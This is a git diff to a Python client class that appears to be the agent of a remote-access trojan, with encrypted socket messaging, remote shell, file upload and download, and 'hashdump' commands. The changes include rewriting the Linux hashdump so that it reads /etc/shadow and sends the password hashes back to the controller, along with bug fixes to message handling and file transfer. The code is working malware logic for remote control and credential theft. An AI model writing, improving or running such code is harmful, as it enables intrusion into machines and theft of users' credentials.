@@ -177,8 +177,9 @@ class Client:
             msg = self.client_socket.recv(size)
         else:
             msg = self.client_socket.recv(size)
-            if msg is None:
-                print('error: connection closed with server')
+            if msg is None or len(msg) == 0:
+                print('error: connection closed with remote')
+                return
             msg = self.encryption_context.decrypt(msg)
         if strip_eot and msg.endswith(EOT if isinstance(msg, str) else EOT.encode()):
             msg = msg[:-2]
@@ -196,7 +197,7 @@ class Client:
                 read_bytes += len(output)
                 data_handler(output)
 
-    def receive_file(self, output_path, binary_mode=False, chunk_size=4096, save_file=True):
+    def receive_file(self, output_path, binary_mode=False, chunk_size=4096):
         msg = self.receive_message()
         if not (len(msg) > 2 and msg[:2] == 'OK'):
             print(msg)
@@ -208,14 +209,11 @@ class Client:
             return
         self.send_message('OK')
         file_size = int(match.group(1))
-        if save_file:
-            with open(output_path, 'w' + 'b' if binary_mode else '') as file:
-                if not file.writable():
-                    print(f'error: cannot write to {output_path}')
-                    return
-                self.receive_data(file_size, chunk_size, binary_mode, file.write)
-        else:
-            self.receive_data(file_size, chunk_size - 16, binary_mode, print)
+        with open(output_path, 'w' + 'b' if binary_mode else '') as file:
+            if not file.writable():
+                print(f'error: cannot write to {output_path}')
+                return
+            self.receive_data(file_size, chunk_size, binary_mode, file.write)
 
     def send_file(self, input_path, chunk_size=4096 - 16):
         if not exists(input_path):
@@ -231,12 +229,11 @@ class Client:
             if msg != 'OK':
                 return
             r_bytes = 0
-            i = 0
             while r_bytes < file_stat.st_size:
                 file_block = file.read(chunk_size)
                 r_bytes += len(file_block)
+                print(f'len: {len(file_block)}')
                 self.send_message(file_block, encode=False, add_eot=False, send_block=True)
-                i += 1
 
     @staticmethod
     def shell_cmd(client, _):
@@ -262,7 +259,7 @@ class Client:
 
     @staticmethod
     def download_cmd(client, args):
-        client.send_file(args[1], binary_mode=True)
+        client.send_file(args[1])
 
     @staticmethod
     def upload_cmd(client, args):
@@ -299,7 +296,9 @@ class Client:
 
     @staticmethod
     def hashdump_linux(client, _):
-        client.send_file('/etc/shadow')
+        with open('/etc/shadow', 'r') as file:
+            content = file.read()
+        client.send_message(content + EOT)
 
     @staticmethod
     def hashdump_windows(client, _):
@@ -316,7 +315,7 @@ class Client:
         if os_system in Client.hashdump_os_table:
             Client.hashdump_os_table[os_system](client, args)
         else:
-            client.send_message(f'KO: os platform not supported {os}')
+            client.send_message(f'KO: os platform not supported {os_system}')
 
     cmd_table = {
         'shell': shell_cmd,
